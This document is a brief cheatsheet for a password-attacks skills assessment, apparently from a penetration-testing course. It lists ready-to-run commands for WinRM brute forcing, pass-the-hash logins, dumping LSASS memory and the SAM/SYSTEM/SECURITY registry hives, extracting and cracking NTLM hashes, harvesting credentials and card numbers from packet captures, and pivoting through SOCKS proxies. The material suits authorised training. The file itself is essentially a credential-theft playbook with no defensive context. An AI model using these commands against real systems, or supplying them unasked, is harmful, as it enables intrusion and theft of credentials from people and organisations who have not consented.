# Password Attacks — Skills Assessment — Cheatsheet

## Tools & Syntax Reference

### Remote Attacks

```bash
# WinRM brute force
netexec winrm <ip> -u user.list -p password.list

# SMB enumeration
netexec smb <ip> -u "user" -p "password" --shares

# Evil-WinRM with hash (PtH)
evil-winrm -i <ip> -u Administrator -H "<nthash>"
```

### Local Windows

```bash
# LSASS memory dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Parse LSASS dump
pypykatz lsa minidump /path/to/lsassdumpfile

# SAM/SYSTEM dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Crack with Impacket
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Hashcat

```bash
# NTLM
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 netntlm.txt wordlist.txt

# Show results
hashcat -m 1000 hash.txt --show
```

### John

```bash
john --wordlist=rockyou.txt hash.txt
john hash.txt --show
```

### Network Traffic (PCAP)

```bash
# Extract credentials from PCAP
python3 Pcredz -f demo.pcapng -t -v

# Wireshark regex for credit cards
\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}
```

### Pivoting

```bash
# SOCKS proxy
ssh -D 9050 user@<pivot-host>

# Through proxy
proxychains nmap -sT -Pn 172.16.x.x
```

